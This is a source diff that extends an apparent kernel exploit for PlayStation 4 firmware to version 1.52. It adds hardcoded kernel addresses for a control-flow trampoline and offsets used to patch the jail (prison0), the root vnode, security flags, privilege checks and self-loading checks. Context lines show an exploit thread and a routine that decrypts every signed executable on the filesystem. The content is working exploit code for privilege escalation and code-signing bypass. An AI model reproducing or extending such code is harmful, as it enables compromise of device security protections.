@@ -177,10 +177,13 @@ void *exploitThread(void *none)
     uint8_t trampolinetail[13] = { 0x50, 0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, 0xFF, 0xE0 };
     
     if (fw_version == 101) {
-        uint8_t fwspecific[8] = { 0x59, 0x7D, 0x46, 0x82, 0xFF, 0xFF, 0xFF, 0xFF };
+        uint8_t fwspecific[8] = { 0x59, 0x7D, 0x46, 0x82, 0xFF, 0xFF, 0xFF, 0xFF }; // 0xFFFFFFFF82467D59
+        memcpy(trampolinecode + 3, fwspecific, 8);
+    } else if (fw_version == 152) {
+        uint8_t fwspecific[8] = { 0x89, 0xA8, 0x3F, 0x82, 0xFF, 0xFF, 0xFF, 0xFF }; // 0xFFFFFFFF823FA889
         memcpy(trampolinecode + 3, fwspecific, 8);
     } else {
-        uint8_t fwspecific[8] = { 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF };
+        uint8_t fwspecific[8] = { 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF }; // 0xFFFFFFFF82403919
         memcpy(trampolinecode + 3, fwspecific, 8);
     }
     
@@ -390,6 +393,17 @@ int _main(struct thread *td)
         privchk1  = KERN_176_PRIVCHECKPASS1;
         privchk2  = KERN_176_PRIVCHECKPASS2;
         break;
+    case 152:
+        prison0   = KERN_152_PRISON0;
+        rootvn    = KERN_152_ROOTVNODE;
+        printf    = KERN_152_PRINTF;
+        secflags  = KERN_152_SECURITYFLAGS;
+        hasmself  = KERN_152_PATCH_HASMSELF;
+        canmself  = KERN_152_PATCH_CANMSELF;
+        loadable  = KERN_152_PATCH_LOADABLE;
+        privchk1  = KERN_152_PRIVCHECKPASS1;
+        privchk2  = KERN_152_PRIVCHECKPASS2;
+        break;        
     case 101:
         prison0   = KERN_101_PRISON0;
         rootvn    = KERN_101_ROOTVNODE;
@@ -411,7 +425,6 @@ int _main(struct thread *td)
     printfsocket("[ ] Firmware: %d\n", fw_version);
     
     if (fw_version < 315) {
-        
         initJIT();
         
         //int (*printfkernel)(const char *fmt, ...) = (void *)printf;
@@ -474,7 +487,7 @@ int _main(struct thread *td)
     traverse_dir("/", root_dir, decrypt_self_to_elf);
     
 #ifdef DEBUG_SOCKET
-    munmap(dump, PAGE_SIZE);    
+    munmap(dump, PAGE_SIZE);
 #endif
     
     sceNetSocketClose(sock);
